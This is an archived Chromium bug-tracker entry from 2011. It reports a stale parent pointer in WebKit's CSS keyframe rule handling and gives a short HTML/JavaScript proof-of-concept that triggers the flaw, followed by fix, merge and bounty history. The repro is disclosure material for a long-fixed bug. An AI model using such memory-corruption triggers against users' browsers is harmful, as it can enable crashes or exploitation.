# Stale pointers in CSSOM - 2

| Field | Value |
|-------|-------|
| **Issue ID** | [40086694](https://issues.chromium.org/issues/40086694) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink |
| **Reporter** | in...@chromium.org |
| **Assignee** | mo...@google.com |
| **Created** | 2011-01-06 |
| **Bounty** | $1,000.00 |

## Description

Split off from <https://crbug.com/chromium/68558>  

Reporter: Serg Gglazunov

2. WebKitCSSKeyframeRule sets its style declaration m\_parent to the parent rule in  
   
   void WebKitCSSKeyframeRule::setDeclaration(PassRefPtr<CSSMutableStyleDeclaration> style)  
   
   {  
   
   m\_style = style;  
   
   m\_style->setParent(parent());  
   
   }  
   
   and doesn't call m\_style->setParent(0) when the keyframe rule is detached.

**VERSION**  

Chromium 10.0.628.0 (70414)

Repro

<html>
<head>
<script>
function step1()
{
style = document.createElement('style');
style.textContent = '@-webkit-keyframes anim { from { color: green } }';
document.head.appendChild(style);

rule = document.styleSheets[0].cssRules[0].findRule('from');

document.head.removeChild(style);

setTimeout(step2, 100);  

}

function step2()  

{  

obj = rule.style.parentRule;

location.reload();  

}  

</script>

</head>
<body onload="step1()"></body>
</html>

## Timeline

### sc...@gmail.com (2011-01-06)

[Empty comment from Monorail migration]

### in...@chromium.org (2011-01-12)

filed webkit bug - https://bugs.webkit.org/show_bug.cgi?id=52320

### ch...@gmail.com (2011-01-27)

[Empty comment from Monorail migration]

### ch...@gmail.com (2011-01-27)

fixed in http://trac.webkit.org/changeset/76828

### sc...@gmail.com (2011-01-30)

[Empty comment from Monorail migration]

### sc...@gmail.com (2011-02-01)

@serg.glazunov: congratulations! This bug was of your usual excellent quality. Thanks in particular for deriving a repro from the code flaw. Rewarding at the $1000 level due to these factors.

----
Boilerplate text:
Please do NOT publicly disclose details until a fix has been released to all our
users. Early public disclosure may cancel the provisional reward.
Also, please be considerate about disclosure when the bug affects a core library
that may be used by other products.
Please do NOT share this information with third parties who are not directly
involved in fixing the bug. Doing so may cancel the provisional reward.
Please be honest if you have already disclosed anything publicly or to third parties.
----

### in...@chromium.org (2011-02-09)

m9 merged in http://trac.webkit.org/changeset/78084, http://trac.webkit.org/changeset/78086.

Still needs m10 merge.

### in...@chromium.org (2011-02-09)

merged to m10 in r78112

### sc...@gmail.com (2011-03-04)

Invoice finalized; payment is in e-payment system.

### js...@chromium.org (2011-03-21)

[Empty comment from Monorail migration]

### js...@chromium.org (2011-10-05)

Batch update.

### js...@chromium.org (2012-04-18)

Lifting view restrictions.

### js...@chromium.org (2012-04-18)

[Empty comment from Monorail migration]

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### is...@google.com (2016-10-02)

This issue was migrated from crbug.com/chromium/68741?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40086694)*
